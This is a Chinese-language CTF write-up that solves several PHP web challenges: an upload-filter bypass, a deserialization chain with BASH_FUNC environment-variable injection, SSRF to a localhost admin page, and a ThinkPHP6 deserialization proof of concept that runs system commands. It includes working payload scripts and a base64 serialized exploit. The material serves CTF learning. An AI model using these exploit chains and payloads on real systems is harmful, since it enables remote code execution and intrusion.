```
<?php
	if(isset($_FILES['upfile'])){
		$uploaddir = 'uploads/';
		$uploadfile = $uploaddir . basename($_FILES['upfile']['name']);
		$ext = pathinfo($_FILES['upfile']['name'],PATHINFO_EXTENSION);

		$text = file_get_contents($_FILES['upfile']['tmp_name']);


		echo $ext;

		if (!preg_match("/ph.|htaccess/i", $ext)){

			if(preg_match("/<\?php/i", $text)){
				echo "茂夫说：你的文件内容不太对劲哦<br>";
			}
			else{
				move_uploaded_file($_FILES['upfile']['tmp_name'],$uploadfile);
				echo "上传成功<br>路径为:" . $uploadfile . "<br>";
			}
		} 
		else {
			echo "恶意后缀哦<br>";
			
		}
	}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>上传文件</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('100.jpg');
            background-size: cover;
            background-position: center;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        form {
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        input[type="file"] {
            margin-bottom: 10px;
        }

        input[type="submit"] {
            background-color: #007bff;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <form action="upload.php" method="POST" enctype="multipart/form-data">
            <p>请不要上传php脚本哈，不然我们可爱的茂夫要生气啦</p>
            <input type="file" name="upfile" value="" />
            <br>
            <input type="submit" name="submit" value="提交" />
        </form>
    </div>
</body>
</html>


```
可以看到过滤了.php和htaccess然后把php文件的短标签<?php过滤了，浅浅绕过一下
![4885c3eca149bc3f4fb3f811b69a0474.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708265591445-b4ed35d1-a0bc-44ec-bd13-ad4fd319b408.png#averageHue=%23fdf9ef&clientId=uf9445bcd-8e18-4&from=paste&height=45&id=uc9f5dbab&originHeight=56&originWidth=289&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3765&status=done&style=none&taskId=u4aabefa2-cc13-465c-a953-c8fac3a9dec&title=&width=231.2)
![8906d2831adcc766e3c4bdc1b9a38486.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708265843673-50a1ea9d-ced1-4607-9168-9117a9c473c4.png#averageHue=%238c9e8d&clientId=uf9445bcd-8e18-4&from=paste&height=60&id=u3635e82c&originHeight=75&originWidth=203&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14355&status=done&style=none&taskId=u0db05765-bed8-459f-8651-cee95e1b78e&title=&width=162.4)
但是eval被ban了换成system
![05b89aa534f06e1ce3a462e09976e4f6.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708311174295-d4ee95cb-e65a-4010-a22c-94f91e24ec93.png#averageHue=%23cad0a0&clientId=uf14d481e-26a9-4&from=paste&height=41&id=uf3b403e0&originHeight=51&originWidth=359&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2954&status=done&style=none&taskId=u60b1494a-ed95-4bc8-9cac-605f03c5dd2&title=&width=287.2)
成功rce
![dfc93bbb8155dabc1574a8b96f38b9c6.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708311233477-5eb4a5cd-3b44-4508-b98f-7333ebfa6377.png#averageHue=%23fbfbfa&clientId=uf14d481e-26a9-4&from=paste&height=269&id=ud99f3534&originHeight=336&originWidth=1565&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32706&status=done&style=none&taskId=u6de06fbb-adea-45d2-baaa-691a05e0f92&title=&width=1252)
![ff3326291cc7258a3e4f292cb8f85703.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708311241866-031f5e85-f2f3-4637-ab3c-e7b20e3f96b9.png#averageHue=%23fbfafa&clientId=uf14d481e-26a9-4&from=paste&height=275&id=u4f730456&originHeight=344&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32286&status=done&style=none&taskId=u498b162c-7fca-479a-a70c-7a85149664d&title=&width=1240)
## Not just unserialize
```
<?php

highlight_file(__FILE__);
class start
{
    public $welcome;
    public $you;
    public function __destruct()
    {
        $this->begin0fweb();
    }
    public  function begin0fweb()
    {
        $p='hacker!';
        $this->welcome->you = $p;
    }
}

class SE{
    public $year;
    public function __set($name, $value){
        echo '  Welcome to new year!  ';
        echo($this->year);
    }
}

class CR {
    public $last;
    public $newyear;

    public function __tostring() {

        if (is_array($this->newyear)) {
            echo 'nonono';
            return false;
        }
        if (!preg_match('/worries/i',$this->newyear))
        {
            echo "empty it!";
            return 0;
        }

        if(preg_match('/^.*(worries).*$/',$this->newyear)) {
            echo 'Don\'t be worry';
        } else {
            echo 'Worries doesn\'t exists in the new year  ';
            empty($this->last->worries);
        }
        return false;
    }
}

class ET{

    public function __isset($name)
    {
        foreach ($_GET['get'] as $inject => $rce){
            putenv("{$inject}={$rce}");
        }
        system("echo \"Haven't you get the secret?\"");
    }
}
if(isset($_REQUEST['go'])){
    unserialize(base64_decode($_REQUEST['go']));
}
?>
```
```
<?php
class start
{
  public $welcome;
  public $you;
}
class SE{
  public $year;
}
class CR {
  public $last;
  public $newyear;
}
class ET{
}
$a = new start;
$a -> welcome = new SE;
$a -> welcome -> year = new CR;
$a -> welcome -> year -> newyear = "111Worries";
$a -> welcome -> year -> last = new ET;
echo(base64_encode(serialize($a)));
```
先反序列化绕过正则
然后看到ET类里的rce是环境变量注入执行任意命令网上文章很多
payload：?get[BASH_FUNC_echo%%]=() { cat /f*; }
![e35162959cc2fb8c7cc1243181063c3c.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708325000092-8d5523a6-b4e9-449a-ad16-27c4624643a8.png#averageHue=%23fcfbfa&clientId=uf14d481e-26a9-4&from=paste&height=674&id=udabc62c2&originHeight=843&originWidth=1795&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=143622&status=done&style=none&taskId=ub43b1263-87c5-497c-8ceb-3fd8f47d694&title=&width=1436)
## EZ_SSRF
```
<?php
highlight_file(__file__);
error_reporting(0);
function get($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($curl);
    curl_close($curl);
    echo base64_encode($data);
    return $data;
}
class client{
    public $url;
    public $payload;
    public function __construct()
    {
        $url = "http://127.0.0.1/";
        $payload = "system(\"cat /flag\");";
        echo "Exploit";
    }
    public function __destruct()
    {
        get($this->url);
    }
}
// hint:hide other file
if(isset($_GET['Harder'])) {
    unserialize($_GET['Harder']);
} else {
    echo "You don't know how to pass parameters?";
}

?>
You don't know how to pass parameters?
```
有句注释// hint:hide other file
扫出admin.php
![657ff92f501bbe298613166e27036edc.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708319704620-49d151aa-5526-4a2c-8d58-ce270599590f.png#averageHue=%230c0c0c&clientId=uf14d481e-26a9-4&from=paste&height=32&id=ueaf02ec2&originHeight=40&originWidth=473&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3476&status=done&style=none&taskId=u24c2257e-8015-442f-bcc0-2de22f0c7de&title=&width=378.4)
```
<?php
error_reporting(0);
include "flag.php";
highlight_file(__FILE__);
$allowed_ip = "127.0.0.1";
if ($_SERVER['REMOTE_ADDR'] !== $allowed_ip) {
    die("You can't get flag");
} else {
    echo $flag;
}
?> You can't get flag
```
所以我们的反序列化要访问的url为：http://127.0.0.1/admin.php
```
<?php
class client{
    public $url;
    public $payload;
}
$a = new client;
$a -> url = "http://127.0.0.1/admin.php";
$a -> payload = "system(\"cat /flag\");";
echo(serialize($a));
```
![07ba8aa65418f52423c48f1ec418c75e.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708320828875-20f4eb6f-d220-401b-b34d-d963dbac8d98.png#averageHue=%23f6f8d7&clientId=uf14d481e-26a9-4&from=paste&height=226&id=u3c1478d9&originHeight=282&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40668&status=done&style=none&taskId=u6f8445d5-0dbb-4e80-a233-212d5e073d9&title=&width=994.4)
![a53120ab78e616bf79e822dd4c8ecab9.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708320911446-50c55b4e-2f26-4a4b-8248-420be3c53265.png#averageHue=%23f5f2f0&clientId=uf14d481e-26a9-4&from=paste&height=508&id=u00af1b11&originHeight=635&originWidth=840&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74146&status=done&style=none&taskId=uec0fad46-00b2-4461-91fc-4d764850933&title=&width=672)
## Oyst3rPHP
扫目录看到www.zip泄露
找到网页的代码找三个生蚝，前两个好找
```
<?php
namespace app\controller;
use app\BaseController;

class Index extends BaseController
{

    public function index()
    {
		echo "RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈";
        echo "<img src='../Oyster.png'"."/>";
		
        
		$payload = base64_decode(@$_POST['payload']);
        $right = @$_GET['left'];
        $left = @$_GET['right'];
        
		$key = (string)@$_POST['key'];
        if($right !== $left && md5($right) == md5($left)){
            
			echo "Congratulations on getting your first oyster";
			echo "<img src='../Oyster1.png'"."/>";
            
			if(preg_match('/.+?THINKPHP/is', $key)){
                die("Oysters don't want you to eat");
            }
            if(stripos($key, '603THINKPHP') === false){
                die("！！！Oysters don't want you to eat！！！");
            }
			
			echo "WOW！！！Congratulations on getting your second oyster";
			echo "<img src='../Oyster2.png'"."/>";
            
			@unserialize($payload);
			//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？
			//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！
			//小Tips：细狗函数┗|｀O′|┛ 嗷~~
        }
    }
	
	public function doLogin()
    {
    /*emmm我也不知道这是what，瞎写的*/
        if ($this->request->isPost()) {
            $username = $this->request->post('username');
            $password = $this->request->post('password');

           
            if ($username == 'your_username' && $password == 'your_password') {
          
                $this->success('Login successful', 'index/index');
            } else {
              
                $this->error('Login failed');
            }
        }
    }
	
	

}

```
第一个生蚝直接md5弱比较得到
![23a8352be67ef00048e42e87d0a36fbe.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708321660024-28959cfe-d366-440a-818a-1d07368ce53b.png#averageHue=%23bcb2a9&clientId=uf14d481e-26a9-4&from=paste&height=826&id=u88978203&originHeight=1032&originWidth=1379&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1609879&status=done&style=none&taskId=u815f2d42-2cc0-472f-a743-d080c071203&title=&width=1103.2)
第二个生蚝看到网上正则解法
![16568bb9a74b5ef7b1756ca3bc0fca98.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708321739446-7255ca53-e616-4450-80e3-81ec77eb7764.png#averageHue=%23d5d9a7&clientId=uf14d481e-26a9-4&from=paste&height=227&id=uf4eca6f2&originHeight=284&originWidth=1228&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22795&status=done&style=none&taskId=u45c08dad-49d8-4f53-82ad-3dfaad1b1be&title=&width=982.4)
![6f9855d3b9ba4d8b75ca3a1a486a1f97.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708321766698-76607792-b031-4565-86c4-08cd3cea9316.png#averageHue=%237e904c&clientId=uf14d481e-26a9-4&from=paste&height=35&id=uc988d0d1&originHeight=44&originWidth=275&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2491&status=done&style=none&taskId=u8432abd9-adbd-49c3-9e66-bd3f57e5055&title=&width=220)
继续搬出当年山河的脚本
```
import requests
url='http://yuanshen.life:39544/?left=QNKCDZO&right=240610708'
data={
    'key':'2024'*250000+'603THINKPHP'
    }
r = requests.post(url=url,data=data).text
print(r)
```
![d512d4144cd81a93705fec2f4ffb868b.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708322413664-c9629d2f-3ac4-46c5-98cd-521e0956b23b.png#averageHue=%23201f1e&clientId=uf14d481e-26a9-4&from=paste&height=309&id=u2f7663f1&originHeight=386&originWidth=1204&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34301&status=done&style=none&taskId=u3a5b4d89-4c5f-4a58-8b2e-caa3589ee1a&title=&width=963.2)
最后一只生蚝hint说
```php
//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？
//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！
//小Tips：细狗函数┗|｀O′|┛ 嗷~~
```
好好好索性查了波thinkphp6反序列化漏洞这些文章总于找到第三个生蚝
![88e45b62da9d5a10b31bfd8dd057a2f1.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708322819129-a2a46279-0a72-4b92-a51c-71d2f8e1be0a.png#averageHue=%2321201f&clientId=uf14d481e-26a9-4&from=paste&height=190&id=uf1dae659&originHeight=237&originWidth=884&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12553&status=done&style=none&taskId=ubef0c68c-7eca-41a4-b747-88d35cbdc60&title=&width=707.2)
直接套用网上的poc可以命令执行
```php
<?php

// 保证命名空间的一致
namespace think {
    // Model需要是抽象类
    abstract class Model {
        // 需要用到的关键字
        private $lazySave = false;
        private $data = [];
        private $exists = false;
        protected $table;
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;

        // 初始化
        public function __construct($obj='') {
            $this->lazySave = true;
            $this->data = ['cat /Oyst3333333r.php '=>['cat /Oyst3333333r.php ']];
            $this->exists = true;
            $this->table = $obj;    // 触发__toString
            $this->withAttr = ['cat /Oyst3333333r.php '=>['system']];
            $this->json = ['cat /Oyst3333333r.php '];
            $this->jsonAssoc = true;
        }
    }
}

namespace think\model {
    use think\Model;
    class Pivot extends Model {
        
    }
    
    // 实例化
    $p = new Pivot(new Pivot());
    echo(urlencode(base64_encode(serialize($p))));
}

```
```php
import requests
url='http://yuanshen.life:39544/?left=QNKCDZO&right=240610708'
data={
    'key':'a'*1000000+'603THINKPHP',
    'payload':'TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6MjI6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCAiO2E6MTp7aTowO3M6MjI6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCAiO319czoxOToiAHRoaW5rXE1vZGVsAGV4aXN0cyI7YjoxO3M6ODoiACoAdGFibGUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjE3OiIAdGhpbmtcTW9kZWwAZGF0YSI7YToxOntzOjIyOiJjYXQgL095c3QzMzMzMzMzci5waHAgIjthOjE6e2k6MDtzOjIyOiJjYXQgL095c3QzMzMzMzMzci5waHAgIjt9fXM6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjg6IgAqAHRhYmxlIjtzOjA6IiI7czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6MjI6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCAiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6NzoiACoAanNvbiI7YToxOntpOjA7czoyMjoiY2F0IC9PeXN0MzMzMzMzM3IucGhwICI7fXM6MTI6IgAqAGpzb25Bc3NvYyI7YjoxO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czoyMjoiY2F0IC9PeXN0MzMzMzMzM3IucGhwICI7YToxOntpOjA7czo2OiJzeXN0ZW0iO319czo3OiIAKgBqc29uIjthOjE6e2k6MDtzOjIyOiJjYXQgL095c3QzMzMzMzMzci5waHAgIjt9czoxMjoiACoAanNvbkFzc29jIjtiOjE7fQ%3D%3D'
    }
r = requests.post(url=url,data=data)
print(r.text)

```
![94620fa006e9db3a8f0f868026321ed4.png](https://cdn.nlark.com/yuque/0/2024/png/39174886/1708324388403-cd685ac0-8a46-49ba-a7c6-42fa36c3f732.png#averageHue=%23211f1e&clientId=uf14d481e-26a9-4&from=paste&height=394&id=u6c27e3be&originHeight=492&originWidth=1149&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46180&status=done&style=none&taskId=uf63bb159-c261-46a8-b5ed-e5b085cdfe1&title=&width=919.2)
